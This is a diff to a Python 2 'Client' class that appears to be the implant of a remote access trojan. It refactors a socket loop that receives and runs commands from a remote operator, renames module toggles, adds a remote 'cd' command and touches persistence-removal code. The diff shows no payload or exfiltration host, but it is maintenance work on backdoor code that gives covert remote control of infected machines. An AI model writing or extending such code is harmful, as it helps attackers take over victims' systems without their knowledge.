@@ -108,7 +108,7 @@ class Client(object):
 
     def _get_framework(self): return {module:{} for module in self._modules}
     
-    def _cd(self, path): return os.chdir(path) if os.path.isdir(path) else os.chdir('.')
+    def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
     def _pad(self, s): return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
 
@@ -316,7 +316,7 @@ class Client(object):
                     getattr(self, target)()
                 except Exception as e2:
                     if self.__v__:
-                        print 'Remove persistence error: {}'.format(str(e2))
+                        print 'Error removing persistence: {}'.format(str(e2))
             try:
                 self.socket.close()
             except: pass
@@ -331,14 +331,14 @@ class Client(object):
         finally:
             exit(0)
 
-    def _use(self, module):
+    def _enable(self, module):
         try:
             getattr(self, module).im_func.status = True
             return "{} enabled.".format(module.title())
         except Exception as e:
             return "Error: {}".format(str(e))
 
-    def _stop(self, module):
+    def _disable(self, module):
         try:
             getattr(self, module).im_func.status = False
             return "{} disabled.".format(module.title())
@@ -501,10 +501,9 @@ class Client(object):
             prompt = "[%d @ {}]> ".format(os.getcwd())
             self._send(prompt, method='prompt')   
             data = self._receive()
-            if data:
-                cmd, _, action = bytes(data).partition(' ')
-            else:
+            if not data:
                 continue
+            cmd, _, action = bytes(data).partition(' ')
             if cmd in self.commands:
                 result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
             else:
@@ -957,6 +956,9 @@ class Client(object):
 # ------------------ public/client functions --------------------------
 
     @_command
+    def cd(self, *x): return self._cd(*x)
+
+    @_command
     def set(self, x): return self._set(x)
 
     @_command
@@ -999,10 +1001,10 @@ class Client(object):
     def jobs(self): return self._show(self._threads)
     
     @_command
-    def use(self, module): return self._use(module)
+    def enable(self, module): return self._enable(module)
 
     @_command
-    def stop(self, module): return self._stop(module)
+    def disable(self, module): return self._disable(module)
 
     @_command
     def results(self): return self._show(self._result)
